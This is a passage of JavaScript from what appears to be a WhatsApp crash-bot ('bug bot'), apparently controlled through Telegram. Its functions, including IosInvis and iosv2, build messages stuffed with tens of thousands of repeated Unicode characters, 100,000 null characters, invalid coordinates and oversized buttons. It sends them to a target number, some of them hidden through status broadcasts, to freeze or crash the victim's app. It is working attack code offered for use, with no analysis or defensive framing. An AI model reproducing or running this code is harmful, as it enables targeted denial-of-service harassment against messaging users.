                    body: "ꦾ".repeat(1000),
                    mediaType: 1,
                    thumbnailUrl: "https://files.catbox.moe/4tvxva.jpg",
                    sourceUrl: "https://t.me/AngelOfDarkNexx",
                    showAdAttribution: true
                }
            }
        };
        
        await client.sendMessage(target, msg1);
        await new Promise(r => setTimeout(r, 300));
        
   
        const msg2 = await generateWAMessageFromContent(
            target,
            {
                newsletterAdminInviteMessage: {
                    newsletterJid: "1@newsletter",
                    newsletterName: "𓆩᬴𓆪".repeat(5000),
                    caption: "ꦾ".repeat(5000),
                    inviteCode: "ꦽ".repeat(5000),
                    contextInfo: {
                        locationMessage: {
                            degreesLatitude: 23045678087,
                            degreesLongitude: 23045678087,
                            name: "galaxy_message"
                        },
                        forwardingScore: 99999,
                        isForwarded: true,
                        externalAdReply: {
                            title: "Queen Mia Selalu Mengintai ",
                            body: "ꦾ".repeat(5000),
                            mediaType: 1,
                            sourceUrl: "https://"
                        }
                    }
                }
            },
            { forwardingScore: 99999, isForwarded: true, participant: { jid: target } }
        );
        
        await client.relayMessage(target, msg2.message, { messageId: msg2.key.id });
        await new Promise(r => setTimeout(r, 300));
        
        
        const Buttons1 = [];
        for (let i = 0; i < 5; i++) {
            Buttons1.push({
                buttonId: "cta_copy",
                buttonText: { displayText: "ꦽ".repeat(2000) },
                type: 4,
                nativeFlowInfo: {
                    name: "single_select",
                    paramsJson: JSON.stringify({
                        title: "ꦽ".repeat(2000),
                        sections: [{ title: "Mark Zuckerberg", highlight_label: "label", rows: [] }]
                    })
                }
            });
        }
        
        const msg3 = {
            text: "ꦽ".repeat(5000),
            footer: "Queen Miaa vs who?" + "ꦽ".repeat(5000) + "ោ៝".repeat(5000),
            viewOnce: true,
            buttons: Buttons1,
            headerType: 1,
            contextInfo: {
                participant: target,
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 100,
                businessMessageForwardInfo: { businessOwnerJid: target }
            }
        };
        
        await client.sendMessage(target, msg3);
        
        console.log(`success sent to ${target}`);
        return true;
        
    } catch(e) {
        console.log(`error ${e.message}`);
        return false;
    }
}

async function IosInvis(target) {
  const msg = await sock.sendMessage(target, {
    viewOnceMessage: {
      message: {
        location: {
          degreesLatitude: -6.200000,
          degreesLongitude: 106.816666,
          name: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "ꦿꦸ".repeat(2770) + "𑇂𑆵𑆴𑆿𑆿".repeat(20000),
          address: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "ꦿꦸ".repeat(2770) + "𑇂𑆵𑆴𑆿𑆿".repeat(10000)
        }
      }
    }
  });

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: 'meta',
          attrs: {},
          content: [
            {
              tag: 'mentioned_users',
              attrs: {},
              content: [
                {
                  tag: 'to',
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function iosv2(target) {
let locationMessage = {
degreesLatitude: -9.09999262999,
degreesLongitude: 199.99963118999,
jpegThumbnail: { url: "https://files.catbox.moe/ahn9ko.jpg" },
name: "x x x" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
address: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
url: `https://yunxi-ex3sh.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com` + ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿"
};
    
let contextInfo = {
remoteJid: "status@broadcast",
participant: "0@s.whatsapp.net",
fromMe: true,
isForwarded: true,
forwardingScore: 999,
forwardedNewsletterMessageInfo: {
newsletterName: "༑ Fail Beta - ( ./primerose.jpeg ) \"👋\"",
newsletterJid: "120363319314627296@newsletter",
serverMessageId: 1
},
quotedMessage: {
interactiveResponseMessage: {
body: { text: "🦠⃟͒  ⃨⃨⃨𝐈𝐍𝐃𝐈𝐂𝐓𝐈𝐕𝐄⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰", format: "DEFAULT" },
nativeFlowResponseMessage: {
name: "address_message",
paramsJson: "\u0000".repeat(100000),
version: 3
}
}
}
};
    
let msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: { locationMessage, contextInfo }
}
}, {});
    
await sock.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{ tag: "to", attrs: { jid: target } }]
}]
}]
});
    
console.log(chalk.green("x x x"));
await sleep(1000);
}

//


bot.launch()
